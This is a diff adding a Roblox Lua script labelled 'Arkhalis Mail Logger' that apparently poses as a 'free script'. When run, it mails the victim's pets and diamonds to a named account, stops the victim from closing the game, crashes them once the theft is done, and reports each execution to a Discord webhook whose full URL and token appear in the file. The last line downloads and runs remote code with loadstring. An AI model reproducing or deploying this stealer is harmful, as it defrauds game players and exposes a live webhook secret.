@@ -1,0 +1,41 @@
+--[[ Arkhalis Mail Logger ]]--
+
+--[[ Main Config ]]--
+
+_G.Username = "Albert_In12" --// Username To Send Pets To
+
+_G.GiftMessage = "well get logged" --// Message For The Gift To Say
+
+_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
+
+_G.UnlockPets = true --// Unlocks Locked Pets
+
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+
+_G.Crash = true  --// Crashes Them After Its Finished
+
+--[[ Webhook Config ]]--
+
+_G.Enabled = true --// Toggle For Sending Webhooks
+
+_G.Mention = true --// Pings You When Someone Executes
+
+_G.Webhook = "https://discord.com/api/webhooks/1098060739211690094/x83EZEL3AZzt4k8p8YLF61_AKUMgPRUsKfXjhEfnHth7sKQQfCdjgR5m_1TCENaMWkGL" --// Discord Webhook For Executions
+
+--[[ UI Config ]]--
+
+_G.ScriptName = "Armstrong" --// Script Name On The UI
+
+_G.Tip1 = "i love you" --// Gives You Tips On The UI
+
+_G.Tip2 = "free script" --// Gives You Tips On The UI
+
+_G.Tip3 = "1" --// Gives You Tips On The UI
+
+_G.Tip4 = "2" --// Gives You Tips On The UI
+
+_G.Tip5 = "3" --// Gives You Tips On The UI
+
+--[[ Script ]]
+
+loadstring(game:HttpGet("https://arkhalislua.github.io/Lua/Arkhalis.lua"))()
